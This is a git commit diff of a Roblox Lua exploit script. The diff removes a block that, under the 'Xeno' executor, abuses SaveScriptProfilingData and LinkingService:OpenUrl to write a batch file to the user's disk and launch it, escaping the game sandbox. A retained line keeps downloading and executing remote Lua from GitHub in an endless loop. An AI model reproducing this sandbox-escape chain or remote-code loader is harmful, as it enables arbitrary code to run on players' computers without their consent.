7f6e69a510255217a71b59b7675ed6ae6c6b242f
BaconBABA <130968724+BaconBABA@users.noreply.github.com>
2025-02-12 21:29:52 +0700

    Update command.lua

--- command.lua
+++ command.lua
@@ -1,27 +1,3 @@
-if identifyexecutor then
-    local executor = identifyexecutor()
-    if executor == "Xeno" then
-        print("xeno detected!")
-        local unwrappedgame = Instance.new("Part", workspace):FindFirstAncestorWhichIsA("DataModel")
-    local unwrappedgame = script:FindFirstAncestorWhichIsA("DataModel")
-
-    script:FindFirstAncestorWhichIsA("DataModel").LinkingService:OpenUrl(
-    script:FindFirstAncestorWhichIsA("DataModel")
-        :FindService("ScriptContext")
-        :SaveScriptProfilingData(
-            [[
-                @echo off
-				echo thanks for using my script bro
-                start https://discord.gg/8pJCFW8cpG
-                pause
-            ]], 
-            "sigma.bat"
-        )
-)
-    else
-        print("nice!")
-    end
-end
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TextChatService = game:GetService("TextChatService")
 coroutine.wrap(function() while task.wait() do pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/skibidi.lua"))() end) end end)()
